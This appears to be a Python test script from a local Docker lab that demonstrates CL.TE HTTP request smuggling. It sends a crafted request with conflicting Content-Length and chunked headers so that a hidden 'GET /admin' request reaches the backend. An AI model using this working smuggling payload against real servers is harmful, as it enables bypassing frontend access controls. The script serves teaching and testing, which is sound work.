#!/usr/bin/env python3
"""
CL.TE Smuggling Test
====================

This test verifies that the CL.TE lab correctly demonstrates HTTP request
smuggling by sending a crafted payload where:

    Frontend (CL): Reads Content-Length bytes → sees ONE request.
    Backend  (TE): Reads chunked body → sees TWO requests.

The smuggled second request appears because:
    1. Frontend reads Content-Length bytes (which includes the smuggled data).
    2. Backend reads chunked body which terminates at "0\r\n\r\n".
    3. Remaining bytes in the TCP stream become a new request to the backend.

Usage:
    python tests/test_cl_te.py

Requires the lab to be running: docker compose up --build
"""

import socket
import time
import sys


def test_cl_te_smuggling():
    """
    CL.TE Smuggling Test

    Payload structure:
        POST / HTTP/1.1\r\n
        Host: localhost:8080\r\n
        Content-Length: <N>\r\n          ← Frontend reads N bytes as body
        Transfer-Encoding: chunked\r\n  ← Backend uses this to parse body
        \r\n
        0\r\n                            ← Chunked terminator (backend stops here)
        \r\n                            ← End of chunked body
        GET /admin HTTP/1.1\r\n         ← Smuggled! Backend sees this as request #2
        Host: localhost:8080\r\n
        \r\n

    The Content-Length value must cover ALL bytes after the headers,
    including the chunked terminator AND the smuggled request.
    """

    # Build the smuggled request that the backend will see as request #2
    smuggled = b"GET /admin HTTP/1.1\r\nHost: localhost:8080\r\n\r\n"

    # Build the body that the frontend will forward (based on Content-Length)
    # This includes the chunked terminator + the smuggled request
    body = b"0\r\n\r\n" + smuggled

    # Content-Length = length of body (chunked terminator + smuggled request)
    content_length = len(body)

    # Build the complete payload
    payload = (
        b"POST / HTTP/1.1\r\n"
        b"Host: localhost:8080\r\n"
        b"Content-Length: " + str(content_length).encode() + b"\r\n"
        b"Transfer-Encoding: chunked\r\n"
        b"\r\n"
    ) + body

    print("=" * 60)
    print("CL.TE SMUGGLING TEST")
    print("=" * 60)
    print()
    print(f"Payload ({len(payload)} bytes):")
    print(f"  {payload!r}")
    print()
    print(f"Content-Length: {content_length}")
    print(f"Body (what frontend forwards): {body!r}")
    print(f"Smuggled request: {smuggled!r}")
    print()

    # Connect and send
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(5.0)

    try:
        sock.connect(("127.0.0.1", 8080))
        print("Connected to 127.0.0.1:8080")
    except ConnectionRefusedError:
        print("FAIL: Cannot connect to 127.0.0.1:8080")
        print("Make sure the lab is running: docker compose up --build")
        sys.exit(1)

    sock.sendall(payload)
    print(f"Sent {len(payload)} bytes")
    print()

    # Collect responses — we expect TWO HTTP responses
    # (one for the legitimate request, one for the smuggled request)
    responses = b""
    deadline = time.time() + 5.0

    while time.time() < deadline:
        try:
            chunk = sock.recv(4096)
            if not chunk:
                break
            responses += chunk
            # Check if we got two responses
            if responses.count(b"HTTP/1.1") >= 2:
                # Wait a bit more for complete data
                time.sleep(0.5)
                try:
                    extra = sock.recv(4096)
                    if extra:
                        responses += extra
                except socket.timeout:
                    pass
                break
        except socket.timeout:
            if responses:
                break
            continue

    sock.close()

    print("=" * 60)
    print("RESPONSES RECEIVED")
    print("=" * 60)
    print()
    print(responses.decode("utf-8", errors="replace"))
    print()

    # Verify: we should have received TWO HTTP responses
    response_count = responses.count(b"HTTP/1.1")
    print("=" * 60)
    print("VERIFICATION")
    print("=" * 60)
    print()
    print(f"Number of HTTP responses received: {response_count}")

    if response_count >= 2:
        print("[PASS] Backend processed the smuggled request!")
        print("       The frontend saw ONE request (Content-Length).")
        print("       The backend saw TWO requests (chunked encoding stopped early,")
        print("       remaining bytes became a second request).")

        if b"ADMIN AREA" in responses:
            print("       [PASS] Smuggled request reached /admin endpoint!")
        else:
            print("       [INFO] Smuggled request was processed but /admin response not found.")
            print("              Check docker compose logs for backend output.")

        return True
    else:
        print("[FAIL] Expected 2+ responses, got", response_count)
        print("       The smuggling did not work as expected.")
        print("   Check docker compose logs for debugging:")
        print("     docker compose logs cl-te-frontend")
        print("     docker compose logs cl-te-backend")
        return False


if __name__ == "__main__":
    success = test_cl_te_smuggling()
    sys.exit(0 if success else 1)
